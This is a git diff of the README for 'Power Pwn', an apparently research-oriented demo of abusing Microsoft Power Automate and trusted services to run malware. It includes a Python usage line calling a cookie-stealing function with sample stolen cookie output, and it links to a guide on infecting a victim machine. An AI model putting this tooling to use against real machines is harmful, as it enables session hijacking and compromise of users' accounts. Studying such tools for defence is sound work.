@@ -1,4 +1,10 @@
-### Usage
+# Power Pwn
+
+Power Pwn is a demo showing how to repurpose Microsoft-trusted executables, service accounts and cloud services to power a malware operation.
+
+<a href="https://powerautomate.microsoft.com/en-us/robotic-process-automation/"><img src="https://docs.microsoft.com/en-us/power-pages/media/overview/power-platform.png" alt="Power Pwn" width="500" height="250" /></a>
+
+## Usage
 
 ```python
 from powerpwn.cli import PowerPwn
@@ -49,11 +55,10 @@ pp.steal_cookie("https://www.google.com").StealCookie
 # StealCookieOutputs(Cookie='1P_JAR=2022-07-16-13; OGPC=19027681-1:')
 ```
 
-### Troubleshoot
+## How To
 
-### SessionExistsForTheUserWhenUnattended
+[How to set up your Power Pwn cloud environment](docs/cloud_setup.md)
 
-Got `success=False` with `code=SessionExistsForTheUserWhenUnattended` in `unattendedError`?
+[How to infect a victim machine](docs/infect_machine.md)
 
-Got to Machines -> locate the machine -> three vertical dots -> Edit details -> Reuse sessions for unattended runs.
-See [reuse sessions for unattended runs](https://go.microsoft.com/fwlink/?linkid=2187511)
+[How to troubleshoot execution errors](docs/infect_machine.md)
